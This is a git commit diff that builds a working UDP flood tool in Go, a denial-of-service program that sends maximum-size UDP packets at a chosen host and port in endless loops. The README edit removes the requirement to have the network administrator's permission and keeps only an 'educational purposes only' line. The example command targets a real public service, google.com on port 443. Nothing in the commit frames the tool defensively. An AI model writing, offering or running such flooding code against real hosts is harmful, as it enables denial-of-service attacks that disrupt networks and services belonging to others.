1b1f1aa30dfe596c97bb4b9e2dcea94528ee2794
ammario <ahb363636@gmail.com>
2015-10-02 00:16:30 -0500

    some code

--- README.md
+++ README.md
@@ -1,7 +1,7 @@
 # UDPFlood
-A simple UDP flooder written in Golang. Use this for educational purposes with permission of the network administrator.
+A simple UDP flooder written in Golang. **Use this for educational purposes only.**
 
 ## Usage
 ```bash
-udpflood -h google.com -p 443
+udpflood -h google.com -p 443 --threads 1 --size 65507
 ```
--- udpflood.go
+++ udpflood.go
@@ -2,8 +2,40 @@ package main
 
 import (
     "github.com/alecthomas/kingpin"
+    "net"
+    "fmt"
 )
 
-func main {
+func main () {
+    //Parse command line flags
+    var (
+        _host     = kingpin.Flag("host", "Hostname").Short('h').Required().String()
+        _port     = kingpin.Flag("port", "Port number").Short('p').Required().Int()
+        _threads     = kingpin.Flag("threads", "Thread count").Short('t').Default("1").Int()
+        _size     = kingpin.Flag("size", "Packet Size").Short('s').Default("65507").Int()
+    )
+    kingpin.Parse()
+
+    fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
+    //Create send buffer
+    var buf []byte = make([]byte, *_size)
+
+    //Establish udp
+    conn, err := net.Dial("udp", fullAddr); if err != nil {
+        fmt.Println(err)
+    } else {
+        fmt.Printf("Flooding %s\n", fullAddr)
+        for i := 0; i < *_threads; i++ {
+            go func(){
+                for {
+                    conn.Write(buf)
+                }
+            }()
+        }
+    }
+
+    //Sleep forever
+    sleeper := make(chan bool, 1)
+    <-sleeper
 
 }
